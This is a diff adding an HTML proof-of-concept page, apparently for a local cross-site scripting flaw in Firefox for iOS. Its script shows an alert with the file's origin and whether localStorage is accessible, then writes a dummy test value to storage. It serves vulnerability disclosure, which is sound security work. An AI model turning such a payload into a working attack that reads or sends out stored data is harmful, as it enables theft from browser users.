@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC Security Research - Firefox iOS</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .warning { color: red; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>Firefox iOS - Local XSS PoC</h1>
+    <p class="warning">If you see an alert, JavaScript execution is enabled in the local context.</p>
+    
+    <script>
+        // Mencoba mengakses informasi origin dan storage untuk menunjukkan dampak
+        const origin = window.location.origin || "file:// (Local)";
+        const storageAccess = typeof(localStorage) !== 'undefined' ? "Accessible" : "Blocked";
+        
+        // Munculkan alert dengan informasi teknis
+        alert(
+            "VULNERABILITY DETECTED\n" +
+            "------------------------\n" +
+            "Origin: " + origin + "\n" +
+            "Local Storage: " + storageAccess + "\n" +
+            "Context: Downloaded file executing active script."
+        );
+
+        // Opsional: Mencoba menulis ke storage untuk membuktikan persistensi
+        localStorage.setItem('PoC_Test', 'SensitiveData_Exposed');
+        console.log("LocalStorage Write Test Successful");
+    </script>
+</body>
+</html>
+
